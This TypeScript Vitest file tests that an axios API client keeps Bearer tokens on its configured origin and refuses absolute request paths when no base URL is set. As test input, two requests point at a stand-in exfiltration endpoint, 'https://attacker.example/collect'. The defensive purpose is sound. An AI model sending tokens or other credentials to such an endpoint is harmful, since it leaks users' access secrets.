import axios, { AxiosHeaders, type AxiosAdapter } from 'axios'
import { afterEach, expect, it, vi } from 'vitest'

import { createApiClient } from './api-client'

const originalAdapter = axios.defaults.adapter

afterEach(() => {
  axios.defaults.adapter = originalAdapter
})

it('keeps Bearer tokens on the configured API origin for absolute request paths', async () => {
  const observedRequests: Array<{ authorization: string | undefined; url: string }> = []
  const adapter: AxiosAdapter = vi.fn(async (config) => {
    observedRequests.push({
      authorization: config.headers.get('Authorization')?.toString(),
      url: axios.getUri(config),
    })

    return {
      config,
      data: { id: 'auth0|user-a' },
      headers: new AxiosHeaders(),
      status: 200,
      statusText: 'OK',
    }
  })
  axios.defaults.adapter = adapter

  const client = createApiClient(
    vi.fn().mockResolvedValue('access-token'),
    'https://api.example.test',
  )

  await client.get('https://attacker.example/collect')

  expect(observedRequests).toEqual([{
    authorization: 'Bearer access-token',
    url: 'https://api.example.test/https://attacker.example/collect',
  }])
})

it('rejects absolute requests before acquiring a token when the API base URL is blank', async () => {
  const adapter: AxiosAdapter = vi.fn()
  const getAccessTokenSilently = vi.fn().mockResolvedValue('access-token')
  axios.defaults.adapter = adapter

  await expect(Promise.resolve().then(() =>
    createApiClient(getAccessTokenSilently, '').get(
      'https://attacker.example/collect',
    ),
  )).rejects.toThrow('API base URL is not configured')

  expect(getAccessTokenSilently).not.toHaveBeenCalled()
  expect(adapter).not.toHaveBeenCalled()
})
